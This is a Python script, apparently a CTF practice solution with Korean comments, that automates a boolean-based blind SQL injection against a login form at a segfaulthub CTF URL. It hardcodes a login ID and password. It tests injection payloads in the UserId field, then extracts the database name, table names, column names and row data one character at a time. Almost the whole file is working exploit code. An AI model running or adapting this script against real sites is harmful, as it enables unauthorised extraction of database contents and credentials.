# ID 입력칸에만 사용 가능. (Unique)

import requests

URL = 'http://ctf.segfaulthub.com:9999/sqli_3/login.php'            # Blind SQL Injection 공격으 진행하려는 사이트 url
userid = "mario"                                                    # 사이트에서 로그인 가능한 ID
password = "mariosuper"                                             # 사이트에서 로그인 가능한 password

Can_SQLi = ["' #",
            "' and '1'='1", 
            "' and (1=1) and '1'='1", 
            "' and ('test'='test') and '1'='1",
            ]
for i in Can_SQLi:
    sqlquery  = userid+i
    postquery = "UserId="+sqlquery+"&Password="+password+"&Submit=Login"
    res  = requests.post(url=URL, data=postquery, headers={"Content-Type": "application/x-www-form-urlencoded"})
    if "Incorrect" not in res.text:
        print("pass / "+ sqlquery)
    else:
        print("fail / "+ sqlquery)

print("\nDo you make SQLi format ?")
ans = input(" YES = 1\n")
if ans == "1":
    SQLi_attack_format = ["(ascii('t')>0)",
                          "(ascii(substring('test',1,1))>0)",
                          ]
    for i in SQLi_attack_format:
        sqli = userid+"' and "+i+"and '1'='1"
        sqlipostquery = "UserId="+sqli+"&Password="+password+"&Submit=Login"
        res  = requests.post(url=URL, data=sqlipostquery, headers={"Content-Type": "application/x-www-form-urlencoded"})
        if "Incorrect" not in res.text:
            print("pass / "+ i)
        else:
            print("fail / "+ i)
else:
    print("ok, bye")
    exit()

print("format : "+userid+"' and (ascii(substring((SQL), 1,1)) > 0) and '1'='1")
print("Really going to do SQLi ?")
print("search database name.")
ans2 = input(" GO = 1 \n")
if ans2 == '1':
    sqlidb = userid+"' and (ascii(substring((select database()), 1,1))>0) and '1'='1"
    sqlipostquery1 = "UserId="+sqlidb+"&Password="+password+"&Submit=Login"
    res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
    if "Incorrect" not in res.text:
        dbname = ''
        for j in range(1, 101):
            sqli2 = userid+"' and (ascii(substring((select database()),"+str(j)+",1))>0) and '1'='1"
            sqlipostquery2 = "UserId="+sqli2+"&Password="+password+"&Submit=Login"
            res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if "Incorrect" not in res.text:
                for k in range(32, 126):
                    sqli3 = userid+"' and (ascii(substring((select database()),"+str(j)+",1))="+str(k)+") and '1'='1"
                    sqlipostquery3 = "UserId="+sqli3+"&Password="+password+"&Submit=Login"
                    res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
                    if "Incorrect" not in res.text:
                        dbname = dbname + chr(k)
                        break
                    else:
                        pass
            else: 
                break
        print("\n-----\n"+dbname+"\n-----\n")
else:
    print("ok, bye")
    exit()

print("search table name.")
ans3 = input(" YES = 1 \n")
if ans3 == '1':
    sqlitable1 = userid+"' and (ascii(substring((select table_name from information_schema.tables where table_schema = '"+dbname+"' limit 0,1),1,1))>0) and '1'='1"
    sqlipostquery1 = "UserId="+sqlitable1+"&Password="+password+"&Submit=Login"
    res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
    tablelist = []
    if "Incorrect" not in res.text:
        for i in range(0, 10):
            tablename = ''
            sqlitable2 = userid+"' and (ascii(substring((select table_name from information_schema.tables where table_schema = '"+dbname+"' limit "+str(i)+",1),1,1))>0) and '1'='1"
            sqlipostquery2 = "UserId="+sqlitable2+"&Password="+password+"&Submit=Login"
            res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if "Incorrect" not in res.text:
                for j in range(1, 31):
                    sqlitable3 = userid+"' and (ascii(substring((select table_name from information_schema.tables where table_schema = '"+dbname+"' limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
                    sqlipostquery3 = "UserId="+sqlitable3+"&Password="+password+"&Submit=Login"
                    res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
                    if "Incorrect" not in res.text:
                        for k in range(32, 126):
                            sqlitable4 = userid+"' and (ascii(substring((select table_name from information_schema.tables where table_schema = '"+dbname+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
                            sqlipostquery4 = "UserId="+sqlitable4+"&Password="+password+"&Submit=Login"
                            res  = requests.post(url=URL, data=sqlipostquery4, headers={"Content-Type": "application/x-www-form-urlencoded"})
                            if "Incorrect" not in res.text:
                                tablename = tablename + chr(k)
                                break
                            else:
                                pass
                    else:
                        break
                print("\n-----\n"+tablename+"\n-----")
                tablelist.append(tablename)
            else: 
                break 
    else:
        print("failed to pass")
else:
    print("ok, bye")
    exit()

print("search column name.")
print('Select the name of the table to find the column name.')
print(tablelist)
tbname= input('Write down the name of the table\n')
sqlicolumn1 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit 0,1),1,1))>0) and '1'='1"
sqlipostquery1 = "UserId="+sqlicolumn1+"&Password="+password+"&Submit=Login"
res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
columnlist = []
if "Incorrect" not in res.text:
    for i in range(0,10):
        sqlicolumn2 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit "+str(i)+",1),1,1))>0) and '1'='1"
        sqlipostquery2 = "UserId="+sqlicolumn2+"&Password="+password+"&Submit=Login"
        res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
        columnname = ''
        if "Incorrect" not in res.text:
            for j in range(1, 31):
                sqlicolumn3 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
                sqlipostquery3 = "UserId="+sqlicolumn3+"&Password="+password+"&Submit=Login"
                res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
                if "Incorrect" not in res.text:
                    for k in range(32, 126):
                        sqlicolumn4 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
                        sqlipostquery4 = "UserId="+sqlicolumn4+"&Password="+password+"&Submit=Login"
                        res  = requests.post(url=URL, data=sqlipostquery4, headers={"Content-Type": "application/x-www-form-urlencoded"})
                        if "Incorrect" not in res.text:
                            columnname = columnname + chr(k)
                            break
                        else:
                            pass
                else:
                    break
            print("\n-----\n"+columnname+"\n-----")
            columnlist.append(columnname)
        else: 
            break
else:
    print("ok, bye")
    exit()

print("search data name.")
print("select "+tbname+"'s column")
print(columnlist)
columnans = input("\n")
print('table  : '+tbname+'\ncolumn : '+columnans)

sqlidata1 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit 0,1),1,1))>0) and '1'='1"
sqlipostquery1 = "UserId="+sqlidata1+"&Password="+password+"&Submit=Login"
res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
datalist = []
if "Incorrect" not in res.text:
    for i in range(0, 10):
        dataname = ''
        sqlidata2 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit "+str(i)+",1),1,1))>0) and '1'='1"
        sqlipostquery2 = "UserId="+sqlidata2+"&Password="+password+"&Submit=Login"
        res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
        if "Incorrect" not in res.text:
            for j in range(1, 31):
                sqlidata3 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
                sqlipostquery3 = "UserId="+sqlidata3+"&Password="+password+"&Submit=Login"
                res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
                if "Incorrect" not in res.text:
                    for k in range(32, 126):
                        sqlidata4 = userid+"' and (ascii(substring((select "+columnans+" from "+tbname+" limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
                        sqlipostquery4 = "UserId="+sqlidata4+"&Password="+password+"&Submit=Login"
                        res  = requests.post(url=URL, data=sqlipostquery4, headers={"Content-Type": "application/x-www-form-urlencoded"})
                        if "Incorrect" not in res.text:
                            dataname = dataname + chr(k)
                            break
                        else:
                            pass
                else:
                    break
            print(dataname)
            datalist.append(dataname)
        else:
            break
    print(datalist)
else:
    print("ok, bye")
    exit()

# 함수 사용해서 더 간략하게 만들 수 있을 거 같음